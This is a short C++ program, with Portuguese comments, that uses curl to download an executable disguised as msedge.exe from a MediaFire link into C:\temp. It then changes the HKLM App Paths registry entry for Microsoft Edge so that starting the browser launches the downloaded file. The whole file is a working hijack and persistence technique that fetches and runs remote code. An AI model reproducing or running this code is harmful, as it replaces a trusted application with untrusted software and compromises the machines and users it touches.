#include <iostream>
#include <Windows.h>
#include <winreg.h>
#include <cstdlib>

using namespace std;

/*
LSTATUS RegOpenKeyExW(
  [in]           HKEY   hKey,
  [in, optional] LPCWSTR lpSubKey,
  [in]           DWORD  ulOptions,
  [in]           REGSAM samDesired,
  [out]          PHKEY  phkResult
);

LSTATUS RegSetValueExW(
  [in]           HKEY       hKey,
  [in, optional] LPCWSTR     lpValueName,
                 DWORD      Reserved,
  [in]           DWORD      dwType,
  [in]           const BYTE *lpData,
  [in]           DWORD      cbData
);
*/

int writeHKLM(HKEY hKey, LPCWSTR lpSubKey) {


    if (RegOpenKeyExW(hKey, lpSubKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

        LPCWSTR lpData = L"C:\\temp\\msedge.exe";
        DWORD size = (wcslen(lpData) + 1) * sizeof(WCHAR); // Se os dados forem do tipo REG_SZ, REG_EXPAND_SZ ou REG_MULTI_SZ, cbData deverá incluir o tamanho da terminação caracteres ou caracteres de nulos.

        if (RegSetValueExW(hKey, L"Path", NULL, REG_SZ, (const BYTE*)lpData, size) == ERROR_SUCCESS) {
            wcout << "[*] modifying value Path in " << hKey << lpSubKey << "to " << lpData << endl;
        }
        else {
            cout << "[!] error" << endl;
            return 1;
        }

    }

    return 0;

}

void downloadArtifact(string url) {
    system("mkdir C:\\temp");
    string cmd = "curl " + url + " -o C:\\temp\\msedge.exe";
    system(cmd.c_str());
}


int main(void) {

    downloadArtifact("https://download1349.mediafire.com/wtzrcopvuw7gjLqgOC1Zl3wktH2xStDwBIhHXVpiP3zYQEor5RyFAHMa9QjwWO-Eggpu-Byw1ST8j-lKFkgKLvWjpGR4r6RgThxZ-LUoiiURSb9sgOPZZd_AdPq8uHqXr9qs3iMJ3plQ4keBbFg7m0kSvxOTt6aVFNUvYTTCDwnNkpc/3l6xhi82b0lpm1l/msedge.exe");
    writeHKLM(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe");
    return 0;

}
